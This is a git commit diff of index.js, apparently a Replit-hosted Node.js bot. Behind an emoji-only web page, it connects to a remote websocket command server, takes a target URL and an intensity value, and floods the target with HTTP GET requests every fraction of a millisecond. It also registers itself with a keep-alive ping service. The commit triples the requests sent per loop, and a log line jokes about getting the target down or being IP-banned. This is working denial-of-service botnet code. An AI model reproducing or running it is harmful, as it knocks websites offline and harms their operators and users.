0493829a03a096fd30838d60bf14f207c2c3d4fd
1nchpp <76808801+1nchpp@users.noreply.github.com>
2021-06-03 09:22:57 -0500

    Update index.js

--- index.js
+++ index.js
@@ -8,7 +8,7 @@ var randFromArr = (arr) => {
 }
 app.get("/", async (req, res) => {
   var e = ''
-  for (i = 0; i < 10; i++) e+=randFromArr(emojis);
+  for (i = 0; i < 10; i++) e += randFromArr(emojis);
   res.end(`<h1 style="font-size:10vw">${e}</h1>`)
 })
 
@@ -22,9 +22,13 @@ const socket = io("wss://server.iep0kjum6sity5e.repl.co", {
   reconnectionDelayMax: 100000,
 });
 
-setInterval(()=>{
-      for (i=0;i<pow;i++)axios.get(url).catch(err =>{console.log("maybe its down or we got ip banned lol.")})
-      }, .025)
+setInterval(() => {
+  for (i = 0; i < pow; i++) {
+    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.") })
+    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.") })
+    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.") })
+  }
+}, .02)
 
 socket.on('message', async m => {
   console.log(m)
@@ -37,20 +41,20 @@ socket.on('message', async m => {
     pow = p
   }
 })
-socket.on('connect', function() { 
+socket.on('connect', function() {
   console.log("e")
 });
 function reconnect() {
   socket = null;
   console.log("reconnecting lol")
   var socket = io("wss://server.iep0kjum6sity5e.repl.co", {
-  reconnectionDelayMax: 30000,
-  // keep this
+    reconnectionDelayMax: 30000,
+    // keep this
   });
 }
-socket.on('disconnect', () => {setTimeout(()=>{console.log("r")},6000)})
+socket.on('disconnect', () => { setTimeout(() => { console.log("r") }, 6000) })
 async function cringe() {
-  await axios.get("https://ping.iEp0KJuM6sitY5e.repl.co/add?url=https://"+process.env.REPL_SLUG+"."+process.env.REPL_OWNER+".repl.co")
+  await axios.get("https://ping.iEp0KJuM6sitY5e.repl.co/add?url=https://" + process.env.REPL_SLUG + "." + process.env.REPL_OWNER + ".repl.co")
   console.log("ADDED")
 }
 cringe()
